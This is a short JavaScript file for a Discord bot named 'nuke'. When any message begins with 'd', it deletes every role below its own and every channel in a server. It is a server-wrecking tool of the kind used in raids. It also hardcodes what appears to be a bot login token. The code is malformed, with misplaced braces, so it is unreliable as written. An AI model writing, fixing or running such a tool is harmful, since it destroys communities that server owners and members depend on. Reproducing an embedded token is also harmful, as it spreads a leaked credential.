const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log(" ")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `hellooo` }, type: 0 });
});

nuke.on("message", async(msg)=>{


}
if(msg.content.toLowerCase().startsWith("" + "d")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
    })
}
});

nuke.login("NzExODk2NTk1NDM5OTQzNzAw.XsJrXg.vYBclnmYdoC0izwyfcwoF6HUa84");
